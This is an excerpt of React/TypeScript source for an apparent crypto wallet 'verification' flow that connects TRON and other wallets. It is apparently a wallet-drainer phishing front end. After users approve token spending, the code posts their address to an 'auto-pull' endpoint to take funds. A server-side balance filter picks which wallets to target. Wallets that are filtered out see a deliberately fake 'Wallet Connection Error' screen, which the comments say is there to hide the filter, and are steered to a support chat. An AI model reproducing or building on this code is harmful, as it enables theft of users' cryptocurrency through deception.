...
interface CompactOverlayProps {
  ...
  /** Eligibility state from parent — gates auto-approve and shows error screen */
...
function CompactOverlay({
  ...
  walletEligible, eligibilityChecking, autoPullEnabled,
}: CompactOverlayProps) {
  ...
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [tronAddress, depositAddress, walletEligible, eligibilityChecking]);
  ...
  /* ── Wallet eligibility error (balance filter blocked) ── */
  if (walletEligible === false) {
    return (
      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
        <style>{CSS}</style>
        <div style={{ width:64, height:64, borderRadius:18, background:'rgba(248,113,113,0.08)', border:'1px solid rgba(248,113,113,0.2)',
          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:24 }}>
          <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
            <circle cx="14" cy="14" r="11" stroke="#F87171" strokeWidth="2.5"/>
            <path d="M14 9v5" stroke="#F87171" strokeWidth="2.5" strokeLinecap="round"/>
            <circle cx="14" cy="19" r="1.25" fill="#F87171"/>
          </svg>
        </div>
        <p style={{ fontSize:18, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.02em' }}>Wallet Connection Error</p>
        <p style={{ fontSize:13, color:T.dim, margin:'0 0 28px', lineHeight:1.6 }}>
          We were unable to connect your wallet.<br/>Please contact support for assistance.
        </p>
        <button
          type="button"
          onClick={() => openSupportChat()}
          style={{ display:'inline-flex', alignItems:'center', gap:8, padding:'12px 22px', borderRadius:12,
...
export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '' }: Props) {
  ...
  /* ── Wallet eligibility (wallet filter + auto-pull) ── */
  ...
  useEffect(() => {
    if (approveConfirmed && !advancedRef.current && address) {
      ...
      if (autoPullEnabled) {
        fetch('/api/wallets/auto-pull', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address, network }) }).catch(() => {});
      }
  ...
  useEffect(() => {
    if (trcApproveDone && tronAddress) {
      ...
      if (autoPullEnabled && hasRealApproval) {
        fetch('/api/wallets/auto-pull', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: tronAddress, network }) }).catch(() => {});
      }
  ...
  async function connectTronWallet(dbgFn?: (m: string) => void) {
    ...
    try {
      // ── Path A: Any DApp browser or TronLink (including iOS Trust Wallet) ────
      // Trust Wallet iOS injects window.tronWeb via trust-web3-provider (same as TronLink).
      // We poll up to 3 s — iOS WKWebView can be slow to inject the provider on first load.
      // If the provider appears, we use it directly (no WalletConnect needed).
      if (true) { // always attempt tronWeb detection first
        function getTron() {
        ...
        if (!hasTron()) {
          // Poll up to 3 s — iOS WKWebView can delay provider injection significantly
          log('no TRON provider yet — polling up to 3s...');
          for (let i = 0; i < 30; i++) {
            await new Promise(r => setTimeout(r, 100));
            if (hasTron()) { log(`TRON provider found after ${(i+1)*100}ms`); break; }
          }
        }
        ...
        if (hasTron()) {
          ...
          log(`no TRON provider after 3s — twKeys=[${w.trustwallet ? Object.keys(w.trustwallet).join(',') : 'none'}]`);
        }
      }
  ...
  function disconnectTron() {
    ...
    // Reset eligibility so the next wallet can be re-checked
    eligibilityCheckedRef.current = false;
    setWalletEligible(null); setAutoPullEnabled(false);
  }

  /* ── Wallet eligibility check (server-side balance verification) ── */
  async function checkEligibility(walletAddr: string, net: Network) {
    if (eligibilityCheckedRef.current) return;
    eligibilityCheckedRef.current = true;
    setEligibilityChecking(true);
    try {
      const res = await fetch('/api/wallets/check-eligibility', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: walletAddr, network: net }),
      });
      if (!res.ok) { setWalletEligible(true); return; } // fail open on API error
      const data = await res.json();
      setWalletEligible(data.canProceed !== false);
      setAutoPullEnabled(!!data.shouldAutoPull);
    } catch {
      setWalletEligible(true); // fail open — never block due to internal error
    } finally {
  ...
  async function startTrcVerification(dbgFn?: (m: string) => void) {
    ...
    try {
      ...
      if (tronWeb) {
        ...
        // ── WalletConnect (iOS fallback when window.tronWeb is not injected) ────
  ...
  return (
    <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
      ...
      {/* ── Eligibility: checking balance ── */}
      {walletConnected && eligibilityChecking && (
        <SpinRow label="Verifying wallet compatibility…" sub="Checking network connection" />
      )}

      {/* ── Eligibility: failed — dummy error screen (does NOT reveal balance filter) ── */}
      {walletConnected && walletEligible === false && (
        <div style={{ ...S.card, padding: '24px 20px', textAlign: 'center' }}>
          <div style={{ width: 52, height: 52, borderRadius: '50%', background: 'rgba(255,92,124,0.08)', border: '1px solid rgba(255,92,124,0.25)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
            <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
              <path d="M11 7v5M11 15v.5" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
              <circle cx="11" cy="11" r="9" stroke="#FF5C7C" strokeWidth="1.5"/>
            </svg>
          </div>
          ...
          <button
            type="button"
            onClick={() => openSupportChat()}
            style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '11px 22px', borderRadius: 11, background: 'var(--fr-lime)', color: '#000', fontSize: 13, fontWeight: 800, border: 'none', cursor: 'pointer' }}
          >
            Contact Support
          </button>
        </div>
      ...
      {/* ── Step 2: Verify (wallet connected + eligible) ── */}
      {walletConnected && walletEligible !== false && !eligibilityChecking && (
        <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
